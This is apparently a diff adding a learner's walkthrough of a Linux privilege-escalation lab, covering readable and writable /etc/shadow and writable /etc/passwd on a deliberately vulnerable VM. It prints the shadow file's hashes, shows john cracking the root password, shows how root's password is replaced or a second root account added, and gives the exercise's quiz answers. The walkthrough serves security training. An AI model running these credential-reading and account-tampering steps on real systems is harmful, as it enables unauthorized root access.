@@ -1,0 +1,190 @@
+===================================================================================================
+                                    Readable /etc/shadow 
+===================================================================================================
+
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+
+Note that the /etc/shadow file on the VM is world-readable:
+
+    $ ls -l /etc/shadow
+
+View the contents of the /etc/shadow file:
+
+    $ cat /etc/shadow
+
+Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
+
+Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:
+
+    $ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+Switch to the root user, using the cracked password:
+
+    $ su root
+
+Remember to exit out of the root shell before continuing!
+
+---------------------------------------------------------------------------------------------------
+OBTAINING THE ROOT's PASSWORD HASH
+---------------------------------------------------------------------------------------------------
+
+user@debian:~$ ls -l /etc/shadow
+-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
+user@debian:~$ cat /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::
+lp:*:17298:0:99999:7:::
+mail:*:17298:0:99999:7:::
+news:*:17298:0:99999:7:::
+uucp:*:17298:0:99999:7:::
+proxy:*:17298:0:99999:7:::
+www-data:*:17298:0:99999:7:::
+backup:*:17298:0:99999:7:::
+list:*:17298:0:99999:7:::
+irc:*:17298:0:99999:7:::
+gnats:*:17298:0:99999:7:::
+nobody:*:17298:0:99999:7:::
+libuuid:!:17298:0:99999:7:::
+Debian-exim:!:17298:0:99999:7:::
+sshd:*:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+statd:*:17299:0:99999:7:::
+mysql:!:18133:0:99999:7:::
+
+---------------------------------------------------------------------------------------------------
+
+---------------------------------------------------------------------------------------------------
+RUNNING JOHN_THE_RIPPER ON THE HASH OBTAINED FOR ROOT PASSWORD:
+---------------------------------------------------------------------------------------------------
+
+┌─[hamza@hamza]─[~/Documents]
+└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Created directory: /home/hamza/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password123      (?)
+1g 0:00:00:02 DONE (2021-08-26 03:57) 0.4237g/s 650.8p/s 650.8c/s 650.8C/s cuties..mexico1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+---------------------------------------------------------------------------------------------------
+
+
+---------------------------------------------------------------------------------------------------
+Answer the questions below
+---------------------------------------------------------------------------------------------------
+
+What is the root user's password hash?
+-> $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
+
+What hashing algorithm was used to produce the root user's password hash?
+-> sha512crypt
+
+What is the root user's password?
+-> password123
+
+---------------------------------------------------------------------------------------------------
+
+
+
+===================================================================================================
+                                    Writable /etc/shadow  
+===================================================================================================
+
+
+The /etc/shadow file contains user password hashes and is usually readable only by the root user.
+
+Note that the /etc/shadow file on the VM is world-writable:
+
+    $ ls -l /etc/shadow
+
+Generate a new password hash with a password of your choice:
+
+    $ mkpasswd -m sha-512 newpasswordhere
+
+Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
+
+Switch to the root user, using the new password:
+
+    $ su root
+
+Remember to exit out of the root shell before continuing!
+
+---------------------------------------------------------------------------------------------------
+CHANGING THE ROOT USER'S PASSWORD
+---------------------------------------------------------------------------------------------------
+
+root@debian:~# ls -l /etc/shadow
+-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
+root@debian:~# mkpasswd -m sha-512 newpasswordhere
+$6$cip07QvxZt2cC$5UAGHyMoYgFEwFOoRs/0x04xZDSrL1GsTa04xhgvv3sCtRaptoek9tXzFw47up6OcKIz8mtE5msbeSZS5K2Zs.
+root@debian:~# nano /etc/shadow
+root@debian:~# exit
+exit
+user@debian:~$ su root
+Password: 
+root@debian:/home/user# id
+uid=0(root) gid=0(root) groups=0(root)
+root@debian:/home/user# 
+
+---------------------------------------------------------------------------------------------------
+
+
+===================================================================================================
+                                    Writable /etc/passwd  
+===================================================================================================
+
+The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.
+
+Note that the /etc/passwd file is world-writable:
+
+    $ ls -l /etc/passwd
+
+Generate a new password hash with a password of your choice:
+
+    $ openssl passwd newpasswordhere
+
+Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+
+Switch to the root user, using the new password:
+    $ su root
+
+Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
+
+Now switch to the newroot user, using the new password:
+
+    $ su newroot
+
+Remember to exit out of the root shell before continuing!
+
+---------------------------------------------------------------------------------------------------
+CHANGING THE ROOT USER'S PASSWORD
+---------------------------------------------------------------------------------------------------
+user@debian:~$ ls -l /etc/passwd
+-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
+user@debian:~$ openssl passwd mynewpasswd
+Warning: truncating password to 8 characters
+w.tFRovPz5aCg
+user@debian:~$ nano /etc/passwd
+user@debian:~$ nano /etc/passwd
+user@debian:~$ su root
+Password: 
+root@debian:/home/user# cd
+root@debian:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@debian:~# 
+
+---------------------------------------------------------------------------------------------------
+
+
+
+
+
